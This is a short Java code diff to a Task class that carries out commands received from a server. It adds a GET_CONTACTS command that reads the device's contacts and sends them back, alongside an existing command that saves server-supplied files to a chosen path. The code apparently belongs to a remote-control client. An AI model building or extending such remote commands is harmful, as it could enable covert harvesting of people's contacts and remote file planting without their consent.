@@ -67,6 +67,10 @@ public class Task {
                     case "SAVE_FILE":
                         String[] inputArray = parameters.split(resources.getString(protocol_parameter_separator), 1);
                         output = saveFile(inputArray[0], inputArray[1]);
+                        break;
+                    case "GET_CONTACTS":
+                        output = getContacts();
+                        break;
                 }
                 server.send(Protocol.taskResultsMessage(id, output));
             }
@@ -119,8 +123,6 @@ public class Task {
         return output;
     }
 
-
-
     private String saveFile(String fileLocation, String fileData) {
         String output;
         try {
@@ -135,5 +137,8 @@ public class Task {
         return output;
     }
 
+    private String getContacts() {
+        return OSInterface.getContacts();
+    }
 
 }
